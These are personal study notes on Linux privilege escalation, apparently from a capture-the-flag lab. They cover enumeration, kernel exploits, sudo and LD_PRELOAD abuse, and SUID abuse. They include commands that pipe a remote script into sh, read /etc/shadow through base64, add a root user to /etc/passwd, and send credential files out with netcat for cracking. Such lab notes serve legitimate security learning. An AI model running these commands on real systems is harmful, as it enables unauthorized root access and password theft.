Priv Esc? The exploitation of vulns, design flaws, or configurations in an OS or desktop app to gain unauthorized acces to resources usually restricted from users.
- Reset passwords
- Bypass access control to data
- Edit software configs
- Enable persistent access
- Change user permissions
- Execute admin commands

# Enumeration
[[hostname]]
[[uname]]
[[_proc_version]]
[[_etc_issue]]
[[ps]]
[[env]]
[[sudo]]
[[ls]]
[[id]]
[[_etc_password]]
[[history]]
[[ifconfig]] + [[ip]]
[[netstat]]
[[find]]
[[python]]

# Automated Enumeration
Dependent of environment, ie. Python not available on target system
-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
  `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# Kernel Exploits
1. Identify kernel version
2. Search for exploit code for the kernel version
3. Configure/run the exploit
Careful, as some exploits can crash the kernel
https://www.linuxkernelcves.com/cves
Ex. 
1. `uname -r`, get kernel version
2. find appropriate CVE and exploit (CVE-2015-1328), and figure out language used
3. get file to remote host, move to a writeable directory
	1. `nc -lvnp PORT < exploit.c` -- `nc IP PORT > exploit.c`
4. follow exploit instructions (compile c and then run w/ `gcc exploit.c -o exploit` -- `./exploit.c`)

# Sudo
run a `sudo -l` to see all commands with delegated sudo privileges
[https://gtfobins.github.io/](https://gtfobins.github.io/) info on how programs with sudo rights can be leveraged

Application Functions ex. Apache server allows for `apache2 -f ...` to specify a config file, this will spit out an error of the first line of a file if its invalid, like /etc/shadow

### LD Preload
1. check for LD_PRELOAD (w/ env_keep option) `env_keep+=LD_PRELOAD`
2. Write C shell code compiled into a share object (.so extension) [[LD_PRELOAD]]
3. Run program with sudo rights and point LD_PRELOAD to the .so file


`sudo nmap --interactive` ?? apparently gives a shell


# SUID
find SUID executable files with `find / -type f -perm 4000 2>/dev/null`   then compare those executables against GTFOBins: https://gtfobins.github.io

ex. no exploit bin available but nano has SUID set
1. nano to copy passwd and shadow files
2. use `unshadow passwd.txt shadow.txt > passwords.txt`
3. upload with a wordlist to John the Ripper
OR
1. Generate a password with [[openSSL]] `openssl passwd -1 -salt SALT PASS`
2. using nano, add new user to [[_etc_password]] with the password, give root membership
3. `su` to newly created user

Practical ex (given ssh login, low priv): 
0. hardmode it by running nmap, then brute forcing passwords with `hydra` 
1. ssh into karen's account, run `id` to get a sense of privileges
2. Based on the box, I run a `find -perm -4000...` for files that have SUID bit set (could also try `sudo -l` for other commands)
	1. Results are then checked against GTFOBins to look for an exploitable program (use SUID filter)
	2. (optional) overlook options because they don't seem sus
	3. find `base64` on GTFOBins, this will read out any file into base64, also has a --decode option 
3. `base64 /etc/shadow | base64 -d > shadow.txt` to write out, and then decode the shadow file (make sure you're in a writeable dir)
4. `nc ... < shadow.txt` to a listener to transfer files to local machine (send over `/etc/passwd `too) 
5. `unshadow PASSWD SHADOW` to get files into a format for John da Ripper to read
6. `john COMBINED_FILE` then spits out any found hashes (can also specify `--wordlist`, but the default works here)